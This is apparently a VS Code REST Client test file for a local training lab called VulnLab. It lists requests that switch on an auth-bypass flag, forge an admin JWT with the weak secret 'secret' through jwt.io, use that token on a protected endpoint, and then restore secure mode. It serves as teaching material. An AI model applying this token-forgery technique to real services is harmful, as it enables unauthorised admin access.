# VulnLab REST Client Test File for VS Code
# Install: REST Client extension (humao.rest-client)
# Usage: Click "Send Request" above each block. Servers must run (localhost:8001 API).
# Adapted for VulnLab API (port 8001, endpoints /flags/activate, weak JWT secret).

# ========= INSTRUCTIONS =========
# 1. Ensure servers running: Frontend localhost:8000, Backend localhost:8001
# 2. For Step 3 JWT:
#    - Go https://jwt.io
#    - Payload: {"sub": "admin"}
#    - Secret (weak when auth_bypass ON): secret
#    - Copy encoded token from right panel
#    - Paste below in Authorization header (replace PASTE_TOKEN_HERE)
# 3. Run steps sequentially. Vuln bar on frontend shows status.

### Step 1 - Check server health and current vulns
GET http://localhost:8001/health

### Step 2 - Login to get initial token (optional baseline)
POST http://localhost:8001/login
Content-Type: application/json

{
  "username": "alice",
  "password": "password123"
}

### Step 3 - Activate AUTH BYPASS vuln (enables weak secret)
POST http://localhost:8001/flags/activate
Content-Type: application/json

{
  "secret": "admin-secret",
  "vuln": "auth_bypass"
}

### Step 4 - Forge JWT & Access protected endpoint
# PASTE YOUR FORGED TOKEN BELOW (jwt.io: payload {"sub":"admin"}, secret: "secret")
# Test /search as example protected (requires auth)
GET http://localhost:8001/search?q=test
Authorization: Bearer PASTE_YOUR_FORGED_TOKEN_HERE

### Step 5 - Deactivate AUTH BYPASS (restore secure mode)
POST http://localhost:8001/flags/deactivate
Content-Type: application/json

{
  "secret": "admin-secret",
  "vuln": "auth_bypass"
}

### Bonus: Check health again (vuln OFF)
GET http://localhost:8001/health

# Expected: 
# - Step 1/6: auth_bypass=False
# - Step 3: auth_bypass=True  
# - Step 4: Succeeds with forged weak JWT even expired/invalid strong sig
# VS Code will show response + status!
